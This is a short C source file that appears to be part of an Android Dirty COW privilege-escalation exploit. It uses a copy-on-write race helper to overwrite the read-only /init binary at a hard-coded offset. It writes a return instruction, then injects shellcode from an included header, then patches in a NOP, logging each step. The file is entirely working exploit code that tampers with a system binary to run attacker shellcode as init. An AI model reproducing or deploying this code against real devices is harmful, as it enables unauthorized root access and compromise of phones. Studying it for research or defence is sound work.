#include <android/log.h>
#include <unistd.h>
#include <sys/system_properties.h>

#include "shellcode.h"
#include "shared.h"

// offset into the init binary
#define INIT_OFFSET (0x401b98 - 0x4001c0 + 0x1c0)

#define RET "\xc0\x03\x5f\xd6"
#define NOP "\x1f\x20\x03\xd5"

int main(int argc, const char *argv[]) {
	LOGV("[+] load started");

	LOGV("[+] overwriting init to terminate early");
	if( dirtycow_memcpy("/init", INIT_OFFSET, 4, RET) ) {
		LOGV("[-] ERROR: could not overwrite init with ret");
		return 1;
	}

	LOGV("[+] overwriting init function with shellcode");
	if( dirtycow_memcpy("/init", INIT_OFFSET + 4, shellcode_len, shellcode) ) {
		LOGV("[-] ERROR: could not overwrite init with shellcode");
		return 1;
	}

	LOGV("[+] overwriting init function with a nop");
	if( dirtycow_memcpy("/init", INIT_OFFSET, 4, NOP) ) {
		LOGV("[-] ERROR: could not overwrite init with shellcode");
		return 1;
	}

	LOGV("[+] load done!");

	return 0;
}
